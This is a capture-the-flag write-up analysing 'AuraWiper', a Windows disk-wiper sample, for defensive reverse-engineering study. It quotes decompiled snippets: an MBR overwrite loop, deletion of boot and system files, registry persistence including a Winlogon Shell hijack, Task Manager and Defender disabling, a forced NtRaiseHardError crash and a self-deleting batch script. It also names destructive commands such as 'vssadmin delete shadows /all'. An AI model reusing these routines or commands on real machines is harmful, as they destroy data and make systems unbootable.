# AuraWiper

- Category: malware analysis
- Difficulty: easy
- Challenge link: [malops.io](https://malops.io/challenges/aurawiper)
- Platform: Windows PE32+ (x86-64, GUI subsystem, MSVC 2026, not packed)

"Meridian Cold Chain Logistics loses 340 endpoints in under twenty minutes. No ransom note. No C2 beacon. No negotiation portal. By the time the on-call engineer reaches the office, the fleet is a wall of 'no bootable device' screens and the recovery partitions are gone."

Unusual shape for a rev challenge: there is no flag and nothing to solve. AuraWiper asks fifteen questions about a wiper's structure, so the deliverable is an accurate map of the binary rather than a recovered secret. That changes the method — instead of chasing one data-flow to a comparison, you enumerate every capability and pin each one to an address you can defend.

### Solution:

##### 1. Triage says the sample is not hiding anything

```
$ file 521e714b….bin
PE32+ executable for MS Windows 6.00 (GUI), x86-64, 7 sections

$ diec 521e714b….bin
Linker: Microsoft Linker(14.50.35730)
Compiler: Microsoft Visual C/C++(19.50.35730)[LTCG/C++]
Tool: Microsoft Visual Studio(2026, 18.0-18.3)
Debug data: Records[codeview, vc_feature, pogo]
```

No packer, no protector, image base `0x140000000`. The section table explains the 6.1 MB file — `.rsrc` is 5.6 MB of it, so the actual code is only ~300 KB of `.text`:

```
  0 .text    0004a2e4  0000000140001000
  1 .rdata   0001bf30  000000014004c000
  2 .data    00001a00  0000000140068000
  5 .rsrc    0056ea68  0000000140070000   <-- 5.6 MB
```

`codeview` in the debug records means the build left a PDB path behind:

```
$ strings -a 521e714b….bin | grep -i '\.pdb'
C:\Users\prostone\Desktop\all\Malware-67-main\Release\SF-Verif.pdb
```

The developer fingerprint the brief promised — the last component is **`SF-Verif.pdb`**, and `Malware-67-main` plus the `SF`/`SFV` prefix recur throughout the sample as its internal name.

##### 2. The import table is a capability sheet

On PE this is the cheapest read in the whole analysis: Windows makes almost everything an API call, so what the program can do is legible before decompiling a single instruction.

| Imports | What it buys the wiper |
|---|---|
| `CreateMutexA` | single-instance / role arbitration |
| `RegCreateKeyExA`, `RegSetValueExA`, `RegOpenKeyExA` | persistence + policy tampering |
| `CreateToolhelp32Snapshot`, `Process32FirstW/NextW`, `OpenProcess`, `TerminateProcess` | kill-by-name |
| `OpenProcessToken`, `LookupPrivilegeValueW`, `AdjustTokenPrivileges` | privilege escalation of its own token |
| `CreateFileW`, `WriteFile`, `DeleteFileA`, `SetFileAttributesA` | the destruction primitives |
| `mciSendStringA`, `waveOut*` | media playback — **`mciSendStringA`** is the Media Control Interface entry point |
| `FindResourceA`, `LoadResource`, `LockResource`, `SizeofResource` | that 5.6 MB `.rsrc` blob gets used |
| `MessageBoxA`, `SetWindowsHookExW`, `SetCursorPos` | user harassment |
| `LoadLibraryW` + `GetProcAddress` | something is resolved dynamically |

That last row is the thread worth pulling. Two names show up as plain strings but not as imports, which means they are resolved at runtime out of `ntdll`:

```
$ strings -a code.bin | grep -iE 'ntdll|NtRaise|RtlAdjust'
NtRaiseHardError
RtlAdjustPrivilege
```

##### 3. `main`, and the two mutexes that decide the sample's role

kuna reports 1536 functions, all `sub_*`. Entry is `0x140026968`, and the CRT invoker `sub_1400267ec` calls **`0x1400156F0`** — that is `main`:

```c
unsigned long long sub_1400156f0(void)
{
  v1 = GetConsoleWindow();
  if (v1) ShowWindow(v1,0);
  FreeConsole();                       // GUI subsystem, but hide the console anyway
  sub_14002c350(sub_140030320(0));
  if (sub_140012230()) { }
  return 0;  // warn: funcboundflow: fall-through reached the next function entry
}
```

That warning matters. kuna split `main` in two: the body continues past `0x140015730` into what it labels `sub_140015732`, and nothing in the binary references that address — it is a fall-through, not a function. Confirmed in the disassembly:

```
140015723:  e8 08 cb ff ff   call   0x140012230
140015728:  84 c0            test   %al,%al
14001572a:  0f 84 7b 02 00 00 je     0x1400159ab
140015730:  33 ff            xor    %edi,%edi
140015732:  48 89 5c 24 40   mov    %rbx,0x40(%rsp)   <-- kuna starts a "new function" here
```

So both mutex checks live inside `main`:

```c
  CreateThread(0,0,sub_14000ec90,0);              // message pump
  CreateThread(0,0,sub_140015680,0);              // hide own file
  CreateMutexA(0,0,"Global\\SFV67PayloadLeader");
  if (GetLastError() == 0xb7) {                   // ERROR_ALREADY_EXISTS
    CloseHandle(...);
    CreateThread(0,0,sub_1400154f0,0);            // demote to watchdog
    do { Sleep(60000); } while( true );
  }
  CreateMutexA(0,0,"Global\\SFVDeployOnce");
  if (GetLastError() != 0xb7)
    CreateThread(0,0,sub_1400130f0,0);            // first run on this host
```

The two values are **`Global\SFV67PayloadLeader`** and **`Global\SFVDeployOnce`**. They are not a duplicate-run guard so much as a role election: the first process becomes the payload leader, later ones become watchdogs that respawn it, and `SFVDeployOnce` separately gates the one-time install. A third mutex, `Global\SFVInst_<sanitised exe name>`, exists in `sub_140012230`, but that is a callee — only two are checked in `main` itself.

`main` then fans out into staggered worker threads through a small trampoline that sleeps before dispatching:

```c
unsigned long long sub_14000f370(unsigned int *a0)
{
  Sleep(*a0);
  CreateThread(0,0,*(unsigned long long *)&a0[2],0,0,0);
  sub_140026c34(a0,0x10);
  return 0;
}
```

##### 4. Persistence: four mechanisms, all in one installer

`sub_140013E00` is the installer, reached via `main → sub_140015590 → sub_140013690` (which checks whether the Startup copy already exists). Its entire API surface is three `RegOpenKeyExA` / `RegSetValueExA` / `RegCloseKey` triples plus a filesystem write, and the hive handles disambiguate them — `0xFFFFFFFF80000001` is `HKEY_CURRENT_USER`, `0xFFFFFFFF80000002` is `HKEY_LOCAL_MACHINE`:

```c
  RegOpenKeyExA(0xffffffff80000001,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,2)
  RegOpenKeyExA(0xffffffff80000002,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,2)
  sub_140030d1c("APPDATA");
  sub_1400183c0(&v16,"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",0x2f);
  RegOpenKeyExA(0xffffffff80000002,"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",0,2)
  RegSetValueExA(...,"Shell",0,1);
```

**Four** mechanisms:

1. `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
2. `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
3. Startup folder — `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`
4. `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` → `Shell`

Each writes three filenames from a table at `0x14005A398`, with the matching value names at `0x14005A3B0`. The Winlogon one is the nastiest: `Shell` normally holds `explorer.exe`, and the sample rewrites it to `explorer.exe,"<payload>"` so the wiper launches as part of the shell itself. Two other routines re-apply this set rather than adding to it — `sub_140014630` (Run keys + Startup) and `sub_140013670 → sub_140013410` on an 8-second loop — so the count of distinct mechanisms stays at four.

##### 5. Killing the watchers

Two functions share this job, and it is worth keeping them straight because they answer different questions.

**`0x140011BE0`** is the one that terminates common system monitoring tools by name. It loops forever, naming the five processes an analyst or admin would reach for, then boosts itself to realtime so it wins the race against anything the user manages to start:

```c
void sub_140011be0(void)
{
  v2 = 20000;
  do {
    Sleep(v2);
    sub_140010570("taskmgr.exe");
    sub_140010570("ProcessHacker.exe");
    sub_140010570("procexp.exe");
    sub_140010570("procexp64.exe");
    sub_140010570("powershell.exe");
    OpenProcess(0x200,0,GetCurrentProcessId());
    if (CONCAT44(dat_4,v1)) {
      SetPriorityClass(CONCAT44(dat_4,v1),0x100);   // REALTIME_PRIORITY_CLASS
      CloseHandle(CONCAT44(dat_4,v1));
    }
    v2 = 100;                                       // first pass 20 s, then every 100 ms
  } while( true );
}
```

`sub_140010570` is the primitive it calls — the generic terminate-by-process-name routine. It widens its argument, walks a Toolhelp32 snapshot, and kills on a case-insensitive match:

```c
void sub_140010570(unsigned long long a0)
{
  MultiByteToWideChar(0,0,a0,0xffffffff);
  v2 = CreateToolhelp32Snapshot(2,0);
  if (v2 != -1) {
    v1 = Process32FirstW(v2,&v7);
    while (v1) {
      if ((!sub_14002c590(v8,v5)) && (v3 = OpenProcess(1,0,v11), v3)) {
        TerminateProcess(v3,0);
        CloseHandle(v3);
      }
      v1 = Process32NextW(v2,&v7);
    }
    CloseHandle(v2);
  }
}
```

Counting its call sites in the disassembly rather than trusting the decompiler:

```
$ objdump -d 521e714b….bin | grep -cE 'call.*0x140010570$'
8
```

AuraWiper invokes the process-termination function **eight** times, split across two callers: the five above from `0x140011BE0`, plus three more from `sub_140011C70` — `SystemSettings.exe`, `SecurityHealthService.exe` and `SecHealthUI.exe`, killed after a wall of `REG ADD` commands disables Defender's real-time protection, so the user cannot turn it back on.

##### 6. The payload gate

Everything above is scaffolding. **`0x140014E40`** is the payload, and it is reached twice — from `sub_140015670` on `main`'s +10 s timer, and from `sub_140015570` when a watchdog decides the leader died. An interlocked flag makes it idempotent:

```c
  v1 = dat_14006aba5;
  LOCK();  dat_14006aba5 = 1;  UNLOCK();
  if (v1) goto label_1400154b4;          // already ran, bail
```

Then it takes the privilege it needs for the finale:

```c
  SetThreadExecutionState(0x80000003);   // block sleep/display-off
  if (OpenProcessToken(GetCurrentProcess(),0x28,&v17)) {
    v2 = LookupPrivilegeValueW(0,0x14005d828,&v18);
    if (v2) { ...; AdjustTokenPrivileges(v4,0,&v19,0x10); }
  }
```

`0x14005D828` is a UTF-16 literal, which is why an ASCII-only `strings` pass never showed it:

```
$ python3 -c "print(open('bin','rb').read()[0x5c028:0x5c050].decode('utf-16-le'))"
SeShutdownPrivilege
```

The privilege AuraWiper modifies is **`SeShutdownPrivilege`** — corroborated later by `RtlAdjustPrivilege(0x13, ...)`, since 19 is `SE_SHUTDOWN_PRIVILEGE`.

With the token adjusted it drops a `\sfv_done.tmp` marker, `chdir`s to its own directory, and launches nine threads on a 0–16 s stagger before sleeping 75 seconds. That fan-out is the whole malware:

![Curated call graph of AuraWiper: main elects a role via two global mutexes, installs four persistence mechanisms and kills monitoring tools, then hands off to the payload orchestrator at 0x140014E40, which stages nine threads before overwriting the MBR, deleting system files and calling NtRaiseHardError](callgraph.png)

The graph was curated by hand from `kuna decompile-all --json` call edges rather than `r2 -A`'s `agCd`, so node labels carry behaviour instead of bare addresses, and CRT nodes are dropped.

##### 7. Making the machine unusable while it works

Three of those threads exist purely to stop the user intervening, and they answer four questions at once.

`sub_140011B50` is the sample's answer to "stop the user killing me". It creates a policy key under `HKEY_CURRENT_USER` and writes a single `REG_DWORD 1` into it:

```c
  if (RegCreateKeyExA(0xffffffff80000001,                              // HKEY_CURRENT_USER
        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",...))
    return 0;
  RegSetValueExA(v2,"DisableTaskMgr",0,4,&Stack0000000000000010,4);    // REG_DWORD 1
```

The key responsible for preventing termination is therefore:

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr
```

That full path is worth assembling deliberately, because it is spread across three separate arguments and no single one of them is the answer. The hive is the `0xFFFFFFFF80000001` handle constant; the path `Software\Microsoft\Windows\CurrentVersion\Policies\System` sits at `0x14005D450` stored bare, with no hive prefix; and `DisableTaskMgr` is the value name in the following `RegSetValueExA`. The path alone is just the container Windows keeps system policies in — `NoRepairOptions`, `DisableCMD` and `EnableLUA` live in the same place — and the value name alone does not say where it lives. Set to 1, Task Manager refuses to open, so the obvious route to killing the process is gone before the user reaches it.

It pairs with the runtime defences from step 5 — the kill loop that reaps `taskmgr.exe` if it somehow launches, and the realtime priority class that wins the race — so the wiper is defended in the registry and in memory at the same time.

`sub_140011CD0` is the Media Control Interface thread — **`mciSendStringA`** driving the optical drive in a loop, a nod to 2000s-era joke malware:

```c
    mciSendStringA("set cdaudio door open",0,0,0);
    Sleep(2000);
    mciSendStringA("set cdaudio door closed");
```

And **`0x14000FC00`** is the random-string dialog spammer, reached via `sub_14000F3C0 → sub_14000F9A0`. It installs a `WH_CBT` hook so the boxes cannot be dismissed normally, then indexes two pointer tables:

```c
  v2 = SetWindowsHookExW(5,0x14000e110,0,GetCurrentThreadId());
  MessageBoxA(0,
      *(unsigned long long *)(... % 6 * 8 + 0x14005dca8),    // lpText
      *(unsigned long long *)(... % 4 * 8 + 0x14005e238),    // lpCaption
      0x1030);
  dat_14006ad10 += 1;
```

The disassembly pins which table is which — `rdx` is argument 2, so the `lpText` array is at **`0x14005DCA8`**:

```
14000fc7a:  4e 8b 84 c1 38 e2 05 00   mov 0x5e238(%rcx,%r8,8),%r8    # lpCaption, mod 4
14000fc94:  41 b9 30 10 00 00         mov $0x1030,%r9d               # uType
14000fc9a:  48 8b 94 d1 a8 dc 05 00   mov 0x5dca8(%rcx,%rdx,8),%rdx  # lpText,    mod 6
14000fca2:  33 c9                     xor %ecx,%ecx                  # hWnd = NULL
14000fca4:  ff 15 de c8 03 00         call *0x3c8de(%rip)            # MessageBoxA
```

Walking the six pointers gives the strings, and they explain the `Malware-67` project name:

```
[0] 0x14005c478 -> '67'
[1] 0x14005c480 -> 'SIXTY-SEVEN'
[2] 0x14005c490 -> 'SIX SEVEN'
[3] 0x14005c49c -> '6  7'
[4] 0x14005c4a8 -> 'SIXTY - SEVEN'
[5] 0x14005c4b8 -> 'S I X T Y  S E V E N'
```

Strictly it is a rotation, not a random draw — `dat_14006AD10` is a counter taken mod 6 — but the effect is the intended one.

##### 8. The wipe

**`0x140011AA0`** overwrites the Master Boot Record. `sub_140049100` zeroes a 512-byte stack buffer, and the loop rewrites sector 0 every 200 ms so that anything restoring it loses the race:

```c
    sub_140049100(v3,0,0x200);
    v1 = CreateFileW(0x14005d428,0x10000000,3,0);   // GENERIC_WRITE
    if (v1 != -1) {
      WriteFile(v1,v3,0x200,v4);
      CloseHandle(v1);
    }
    Sleep(200);
```

`0x14005D428` is again UTF-16 only — `\\.\PhysicalDrive0`. This is the single most important reason to run `strings -el` on a Windows target; an ASCII pass finds no trace of the MBR write at all.

**`0x140011650`** deletes the boot and system files, 20 `DeleteFileA` calls plus a `C:`–`Z:` sweep for the EFI boot data:

```c
  DeleteFileA("C:\\Windows\\System32\\winload.exe");
  DeleteFileA("C:\\Windows\\System32\\winresume.exe");
  DeleteFileA("C:\\Windows\\System32\\winload.efi");
  DeleteFileA("C:\\Windows\\System32\\bootmgr");
  DeleteFileA("C:\\Windows\\System32\\hal.dll");
  DeleteFileA("C:\\Windows\\System32\\ntoskrnl.exe");
  DeleteFileA("C:\\Windows\\System32\\kernel32.dll");
  DeleteFileA("C:\\Windows\\System32\\config\\SAM");
  DeleteFileA("C:\\Windows\\System32\\config\\SYSTEM");
  DeleteFileA("C:\\boot.ini");   DeleteFileA("C:\\ntldr");   DeleteFileA("C:\\bootmgr");
  v7 = 0x43;                                        // 'C'
  do {
    sub_1400183c0(v9,":\\EFI\\Microsoft\\Boot\\bootmgfw.efi",0x21);   DeleteFileA(...);
    sub_1400183c0(v9,":\\EFI\\Microsoft\\Boot\\BCD",0x18);            DeleteFileA(...);
    sub_1400183c0(v9,":\\Boot\\BCD",10);                             DeleteFileA(...);
    v7 += 1;
  } while ((char)v7 < '[');                         // through 'Z'
```

Its sibling `sub_1400106A0` is what actually produces the brief's "recovery partitions are gone" — a single enormous command line running `reagentc /disable`, `vssadmin delete shadows /all`, `wmic shadowcopy delete`, a stack of `bcdedit` calls stripping the boot menu and recovery entries, and `schtasks /delete` against the WinRE and Windows Backup tasks.

##### 9. Forcing the crash, then erasing itself

After the 75-second sleep, the payload resolves both native routines it kept out of the import table and fires:

```c
  v4 = LoadLibraryW(0x14005da58);                              // L"ntdll"
  v9 = (code *)GetProcAddress(v4,"NtRaiseHardError");
  v10 = (code *)GetProcAddress(v4,"RtlAdjustPrivilege");
  (*v10)(0x13,1,0,&v27[0x30]);                                 // SeShutdownPrivilege
  (*v9)(0xdeaddead,0,0,0);
```

Confirmed in the disassembly:

```
1400153bc:  b9 13 00 00 00   mov $0x13,%ecx        # RtlAdjustPrivilege(19)
1400153c1:  ff d0            call *%rax
1400153dd:  b9 ad de ad de   mov $0xdeaddead,%ecx  # NtRaiseHardError(ErrorStatus)
1400153e2:  ff d3            call *%rbx
```

The native API used to trigger the hard system error is **`NtRaiseHardError`**, and the `ErrorStatus` it is handed is **`0xDEADDEAD`** — the documented `MANUALLY_INITIATED_CRASH1` bugcheck code, the same value Windows' own keyboard-initiated crash uses. Combined with the un-writable MBR and the deleted `ntoskrnl.exe`, the BSOD is terminal: the box will not come back up.

The last act is self-deletion, which is also why the challenge's one surviving workstation is plausible — a machine that loses power mid-run leaves the binary on disk:

```c
  v3 = sub_14002c42c("C:\\Windows\\Temp\\clean.bat",0x14005c4fc);
  sub_140008680(v3,"@echo off\n");
  sub_140008680(v3,"timeout /t 3 >nul\n");
  sub_140008680(v3,"del \"%s\"\n",v24);      // own path from GetModuleFileNameA
  sub_140008680(v3,"del \"%%~f0\"\n");       // then the batch file itself
  sub_14000ff20("call \"C:\\Windows\\Temp\\clean.bat\"",0);
```

### Takeaways

`strings -el` is not optional on Windows samples. Two of the fifteen answers — `SeShutdownPrivilege` and the `\\.\PhysicalDrive0` target of the MBR wipe — exist only as UTF-16 literals, and an ASCII-only pass leaves you with a wiper that has no visible privilege escalation and no visible disk write.

A missing import is a lead, not a dead end. `NtRaiseHardError` and `RtlAdjustPrivilege` appear as plain strings with no IAT entry, which is exactly the shape of a `LoadLibraryW` + `GetProcAddress` pair; grepping for `ntdll` next to `GetProcAddress` found the finale in one step.

When a question names a *behaviour*, answer with the function that owns the behaviour, not the primitive underneath it. `0x140010570` is the routine that actually calls `TerminateProcess`, but it is generic — it kills whatever name it is handed, and Defender's UI is one of its callers. The function responsible for terminating *monitoring tools* is `0x140011BE0`, which is where the list of five lives. The registry answer is the same lesson from the other side: `…\Policies\System` is only the container, and `DisableTaskMgr` alone does not say where it lives, so neither half stands on its own. A registry answer wants the fully-qualified thing — hive, path and value — reassembled from the three separate arguments the call spreads it across.

Trust the disassembly for counts and boundaries. Two answers here would have been wrong from the C alone: kuna split `main` at `0x1400156F0` into a phantom second function at `0x140015732`, which nothing references — checking cross-references showed it was a fall-through and put both mutexes back inside `main`. And the eight invocations of the kill primitive were worth confirming with `objdump | grep -c` rather than counting decompiled call sites.

Two tooling notes for next time: `kuna decompile-project` panics on this sample (`loadimage_object.rs:807`, range end 538 out of range for a 512-byte slice), almost certainly choking on the 5.6 MB `.rsrc`, while `kuna decompile-all --json --mode reliable` handles it fine — the size-based mode default would otherwise have picked `fast` on a 6.1 MB file whose code is only 300 KB. And Graphviz does not interpret `\uXXXX` escapes in DOT labels; they render literally as `u2192`, so arrows and multiplication signs have to be written as real UTF-8.
